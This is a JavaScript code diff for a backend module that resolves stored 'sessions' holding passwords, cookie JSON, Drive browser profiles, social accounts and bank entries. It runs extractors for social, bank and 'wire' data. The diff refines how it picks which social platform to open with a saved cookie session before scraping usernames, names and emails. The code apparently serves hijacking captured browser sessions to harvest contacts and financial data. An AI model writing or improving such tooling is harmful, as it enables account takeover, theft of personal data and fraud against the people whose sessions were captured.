@@ -101,6 +101,7 @@ export async function resolveSession(browserId) {
     const socials = safeParse(col('socials'));
     const banks = safeParse(col('banks'));
     const socialPlatform = socials[0]?.platform || socials[0]?.website || '';
+    const socialUsername = socials[0]?.username || socials[0]?.handle || col('username') || '';
     const bankPlatform = banks[0]?.bankName || banks[0]?.website || '';
 
     return {
@@ -113,6 +114,7 @@ export async function resolveSession(browserId) {
         storedPlatform,
         password,
         socialPlatform,
+        socialUsername,
         bankPlatform,
         cookieJSON: typeof cookieJSON === 'string' ? cookieJSON : JSON.stringify(cookieJSON),
         driveUrl: driveUrl || '',
@@ -2380,15 +2382,34 @@ async function extractWire(session, browserId) {
 
 async function extractSocial(session, username, explicitPlatform, browserId) {
     const cookieJSON = session.cookieJSON;
-    const cookiePlatform = (session.socialPlatform || session.category || '').toLowerCase();
-    const platformKey = (explicitPlatform || cookiePlatform || 'twitter').toLowerCase().trim();
-    let config;
-    try {
-        config = getPlatformConfig(platformKey);
-    } catch (e) {
-        logger.warn(`[smartExtract] No extractor config for '${platformKey}', falling back to twitter`);
-        config = getPlatformConfig('twitter');
+    // Resolution chain: explicit arg → stored socials[] hint → row platform
+    // column → category. Each candidate must map to a known extractor config;
+    // no hint at all → skip entirely (never guess and navigate the wrong site,
+    // e.g. x.com for a TikTok row).
+    const candidates = [
+        [explicitPlatform, 'explicit'],
+        [session.socialPlatform, 'socials'],
+        [session.storedPlatform, 'row-platform'],
+        [session.category, 'category'],
+    ];
+    let platformKey = '';
+    let platformSource = '';
+    for (const [raw, source] of candidates) {
+        const key = String(raw || '').toLowerCase().trim();
+        if (!key || key === 'auto' || key === 'unknown') continue;
+        try {
+            getPlatformConfig(key);
+            platformKey = key;
+            platformSource = source;
+            break;
+        } catch (e) { /* not a known social platform — try next hint */ }
     }
+    if (!platformKey) {
+        logger.info(`[smartExtract] No platform hint for ${browserId} (socials/platform/category empty or unknown) — skipping social auto-extract`);
+        return [];
+    }
+    logger.info(`[smartExtract] platform=${platformKey} (source=${platformSource}) browserId=${browserId}`);
+    const config = getPlatformConfig(platformKey);
 
     // Download profile from Drive if available
     let profileDir = null;
@@ -2456,6 +2477,7 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
                                 const parseFunc = new Function('items', extractor.parseFunction);
                                 const elements = await tab1.$$(extractor.selector);
                                 const batch = parseFunc(elements);
+                                if (!Array.isArray(batch)) break;
                                 for (const f of batch) {
                                     const key = f.username || f.name || f.email || '';
                                     if (!key || seen.has(key)) continue;
@@ -2907,7 +2929,7 @@ export async function runSmartExtract(browserId, category, username, platform) {
         let data;
         if (key === 'social') {
             await updateExtractStatus(browserId, 'extracting');
-            data = await extractSocial(session, username || session.email, platform, browserId);
+            data = await extractSocial(session, username || session.socialUsername || session.email, platform, browserId);
         } else if (key === 'bank') {
             await updateExtractStatus(browserId, 'extracting');
             data = await extractBank(session, platform, browserId);
